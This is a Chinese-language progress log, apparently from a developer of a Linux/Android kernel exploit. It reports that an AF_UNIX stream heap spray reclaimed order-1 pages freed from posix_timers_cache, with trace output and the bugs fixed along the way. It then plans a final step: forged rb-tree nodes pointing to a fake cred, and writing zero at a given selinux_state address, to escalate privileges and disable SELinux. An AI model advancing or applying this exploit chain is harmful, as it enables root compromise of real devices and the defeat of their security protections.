# 页回收打通（2026-10-26 03:23）

**结论：8 KiB AF_UNIX `SOCK_STREAM` 喷流确实抢到了 `posix_timers_cache` 释放出来的 order-1 页。**

## 数据

```
=== pressure spray ===
trace buffer -> 16384 KiB
pressure: 63 MiB held in pipe pages
child=4795  timers_armed=2048
kill(4795, SIGKILL)
sprayer: 8193 streams
trace bytes read: 29,376,787
order-1 frees=91   order-1 allocs=8670
  *** CLAIMED pfn=0x2cbb0 ***
  *** CLAIMED pfn=0x2cbb2 ***
  ...
```

独立核对（对同一份 trace 用 shell 侧 grep + comm 求交集）：

```
order-1 frees: 91      ← 2048 / 21 ≈ 97 张页，实测 91 张
order-1 allocs: 8670
交集: 86               ← 91 张被释放的页里 86 张被我们的流拿走
```

## 这一阶段踩过的三个坑（都已修）

| 坑 | 表现 | 真相 |
| --- | --- | --- |
| trace 缓冲太小 | 只读到 681 行、`frees=0` | `buffer_size_kb` 是 0666，放大到 16 MiB |
| 读 trace 只读 1 MiB | 34 MB 的 trace 只看了开头 | 循环读到 EOF（29 MB） |
| `order=1` 匹配写成 `"order=1 "` | 行尾是 `order=1`，一条都不匹配 | 改成"后面不是数字"判定 |

## 现在的位置

```
计时器 2048 个 → 进程死 → exit_itimers 释放 → 91 张 order-1 页回到 buddy
                                                    ↓
                                    8 KiB unix stream 抢到其中 86 张
                                                    ↓
                                          页内容 = 我们写的 8 KiB
```

payload 目前是 **`'A'` 填充（良性）**，所以即使 reap 走过这些页也没 panic
（实测：进程退出后 init 回收僵尸，设备 uptime 不变、`verifiedbootstate` 仍为 green）。

## 下一步（最后一击）

把 payload 从 `'A'` 换成 `--payload-preview` 里算好的伪造节点：

```
节点偏移 0xe0 + n*0x180（21 个槽位）
__rb_parent_color = task + 0x900      （target-8）
rb_right          = 伪造 cred 地址
rb_left           = 0
```

配合 `selinux_state - 7 = 0xffffffe4dc559629` 的写零，就是 BRM 链的第 ⑤⑥ 步。
**这一步会真的写内核内存，panic 概率显著上升**（重启可接受，砖不了）。
